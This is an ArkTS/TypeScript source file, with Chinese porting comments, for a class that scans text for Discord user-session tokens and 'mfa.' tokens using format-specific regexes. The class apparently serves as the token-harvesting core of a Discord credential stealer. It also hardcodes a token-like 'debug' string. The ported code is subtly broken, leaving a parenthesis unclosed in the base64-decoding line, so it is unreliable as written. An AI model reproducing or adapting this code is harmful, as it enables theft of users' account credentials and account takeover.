// 应用ArkTS约束：
// 1. 使用let/const代替var（约束9）
// 2. 使用ES模块导入语法（约束60,61）
// 3. 显式声明类属性（约束18）
// 4. 禁止使用any类型（约束1）
// 5. 使用箭头函数表达式（约束26）
// 6. 使用具体类型替代Object（约束10）
// 7. 文件后缀改为.ets（附加要求）

import XRegExp from "xregexp";
import fs from "promise-fs";
import { List } from "@assasans/storage";
import { Token, TokenType } from "../token.ets"; // 后缀转换

export class Service {
    // 显式声明类属性（约束18）
    public name: string;
    public directory: string;

    constructor(name: string, directory: string) {
        this.name = name;
        this.directory = directory;
    }

    extractTokens(content: string): List<Token> {
        let _a: string | undefined;
        const tokens = new List<Token>();
        
        // 处理正则匹配结果类型
        const matches1 = XRegExp.match(content, /[\w]{24}\.[\w-]{6}\.[\w-]{27}/, 'all') as string[];
        for (const match of matches1) {
            const idMatch = (XRegExp.match(match, /^[\w]{24}/, 'one') as string[])[0] || '';
            // 替换Buffer为TextDecoder（约束75）
            const id = new TextDecoder().decode(new Uint8Array(
                atob(idMatch).split('').map(c => c.charCodeAt(0))
            );
            
            if (/^[0-9]{16,}$/.test(id)) {
                tokens.add(new Token(this, TokenType.Normal, match));
            }
        }

        // 处理第二个正则匹配
        const matches2 = XRegExp.match(content, /mfa\.[\w-]{84}/, 'all') as string[];
        for (const match of matches2) {
            tokens.add(new Token(this, TokenType.MFA, match));
        }

        // 添加调试Token
        tokens.add(new Token(this, TokenType.MFA, "mfa.gZ3ga7RSOLslnH5MEWC5O8-VsX5xvWswilndBYCbUy6gQhG4NYVr4fES14P9AsHgKN7-2LIzRyw3YhQNGP-g"));
        return tokens;
    }

    async exists(path: string): Promise<boolean> {
        try {
            await fs.stat(path);
            return true;
        } catch {
            return false;
        }
    }
}

// 注：以下调整可能需要额外处理：
// 1. XRegExp库需要ArkTS兼容版本
// 2. @assasans/storage库需要提供ArkTS兼容的List实现
// 3. 文件系统操作需要使用ArkTS提供的API替代promise-fs
// 4. base64解码使用TextDecoder替代Buffer
// 5. 类型断言需要确保运行时安全（约束30）
